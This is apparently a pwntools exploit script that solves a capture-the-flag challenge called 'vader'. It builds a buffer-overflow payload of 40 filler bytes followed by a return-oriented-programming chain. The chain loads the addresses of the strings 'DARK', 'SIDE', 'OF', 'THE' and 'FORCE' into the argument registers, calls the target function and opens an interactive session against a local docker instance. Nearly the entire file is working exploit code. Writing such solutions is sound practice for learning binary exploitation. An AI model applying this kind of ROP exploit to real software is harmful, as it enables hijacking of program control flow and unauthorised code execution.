#!/usr/bin/env python3

from pwn import *

print("Hello")

e = ELF('vader')

vaderAddr = e.symbols['vader']
print("vader function @ {}".format(hex(vaderAddr)))

r = ROP(e)
print(r.r8)
print(r.rdi)
print(r.rsi)
print(r.rdx)
print(r.rcx)

payload = b""
charToAdd = 0x61 # lower A
for i in range(0,10):
    charsToAdd = chr(charToAdd) * 4
    print("charsToAdd = {}".format(charsToAdd))

    bytesToAdd = charsToAdd.encode("utf-8")
    payload += bytesToAdd
    charToAdd += 1

string_dark_address  = 0x00402ec9
string_side_address  = 0x402ece
string_of_address    = 0x402ed3
string_the_address   = 0x402ed6
string_force_address = 0x402eda

# rdi gadget
rdi_gadget = 0x40165b
payload += p64(rdi_gadget)

payload += p64(string_dark_address) # 'DARK' address

# rcx and rdx gadget
rcx_rdx_gadget = 0x4011cd
payload += p64(rcx_rdx_gadget)

payload += p64(string_the_address)
payload += p64(string_of_address)

#rsi gadget
rsi_gadget = 0x401659
payload += p64(rsi_gadget)

payload += p64(string_side_address)
payload += p64(0xfacea555) # gadget also loads r15 which we don't need

#r8 gadget
r8_gadget = 0x4011d9
payload += p64(r8_gadget)

payload += p64(string_force_address)

payload += p64(vaderAddr)
payload += b"\n"

print("Payload: {}".format(payload))

#sh = process('./vader')

# Running against my own docker instance running the challenge
sh = remote("127.0.0.1",1337)

#sh = gdb.debug('./vader', '''
#        b *0x4015f3
#        continue
#        ''')

sh.recvuntil(b'>>>', drop=True)

sh.send(payload)
sh.interactive()


